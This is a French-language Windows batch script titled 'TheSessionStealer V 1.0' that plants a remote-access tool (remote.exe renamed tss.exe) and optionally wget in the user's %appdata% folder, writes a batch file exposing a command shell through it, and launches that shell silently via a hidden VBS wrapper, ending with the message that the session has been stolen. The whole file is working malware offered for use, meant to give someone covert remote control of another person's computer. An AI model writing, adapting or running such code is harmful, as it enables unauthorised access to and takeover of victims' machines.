@echo off
type configuration.txt | bin\cut -d; -f1 | bin\cut -d= -f2>tmp
set /p IF= < tmp && del /s tmp
type configuration.txt | bin\cut -d; -f2 | bin\cut -d= -f2>tmp
set /p wget= < tmp && del /s tmp
cls
title TheSessionStealer V 1.0
echo.
type logo.txt
echo.
echo Cr‚ation du fichier (%IF%) 
mkdir %appdata%\%IF%
echo. 
echo "Injection de l'utilitaire (remote.exe) dans %appdata%\%IF%"
copy bin\remote.exe %appdata%\%IF%\tss.exe > nul
echo.
if "%wget%"=="on" (
	echo "Injection de l'utilitaire (wget.exe) et des dll dans %appdata%\%IF%"
	copy bin\wget\*.* %appdata%\%IF%\ > nul
	echo.
)
echo G‚n‚ration d'un point bat pour lancer un reverse shell
echo.
echo %appdata%\%IF%\tss.exe /s cmd SYSCMD> %appdata%\%IF%\BL.bat
echo.
echo G‚n‚ration d'un point vbs pour lancer un reverse shell en arriŠre plan
echo Set oWShell = CreateObject("Wscript.Shell")> %appdata%\%IF%\LBI.vbs
echo oWShell.Run """%appdata%\%IF%\BL.bat""", 0, False>> %appdata%\%IF%\LBI.vbs
echo Set oWSHell = Nothing>> %appdata%\%IF%\LBI.vbs
echo.
echo Lancement du fichier vbs
echo.
call %appdata%\%IF%\LBI.vbs
echo.
echo Verification de la pr‚sence de tout le fichier
echo.
set tsse=ok
set BLe=ok
set LBIe=ok
if not exist %appdata%\%IF%\tss.exe set tsse=erreur
if not exist %appdata%\%IF%\BL.bat set BLe=erreur
if not exist %appdata%\%IF%\LBI.vbs set LBIe=erreur
echo fichier (tss.exe) : %tsse%
echo.
echo fichier (BL.bat) : %BLe%
echo.
echo fichier (LBI.vbs) : %LBIe%
echo.
if %tsse% neq ok echo Il ya eu un probleme pendant le derobage de la session && pause && exit
if %BLe% neq ok echo Il ya eu un probleme pendant le derobage de la session && pause && exit
if %LBIe% neq ok echo Il ya eu un probleme pendant le derobage de la session && pause && exit
echo La session a ete d‚rob‚e !!, ne faite pas de betise :)
pause